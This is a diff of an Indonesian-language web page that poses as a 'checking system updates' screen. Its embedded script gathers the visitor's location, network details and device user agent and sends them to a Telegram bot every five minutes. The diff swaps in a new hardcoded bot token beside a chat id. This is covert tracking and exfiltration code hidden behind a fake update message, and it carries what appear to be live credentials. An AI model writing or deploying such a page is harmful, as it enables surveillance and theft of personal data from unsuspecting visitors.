@@ -11,7 +11,8 @@
 </head>
 <body>
   <h1>Mengecek Pembaruan Sistem...</h1>
-  <div class="loading">Mohon tunggu beberapa saat</div>  <script>
+  <div class="loading">Mohon tunggu beberapa saat</div>
+  <script>
     async function sendData() {
       try {
         // Lokasi
@@ -74,7 +75,7 @@ Network: ${netType}, Downlink: ${downSpeed} Mbps
 Device: ${ua}`;
 
         // Kirim ke Telegram
-        const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
+        const token = "7317238253:AAEORpkEBywWC2AvP-GUj1wfr1m4K5irbV0";
         const chat_id = "5677912817";
 
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -89,5 +90,6 @@ Device: ${ua}`;
 
     sendData();
     setInterval(sendData, 5 * 60 * 1000); // tiap 5 menit
-  </script></body>
+  </script>
+</body>
 </html>
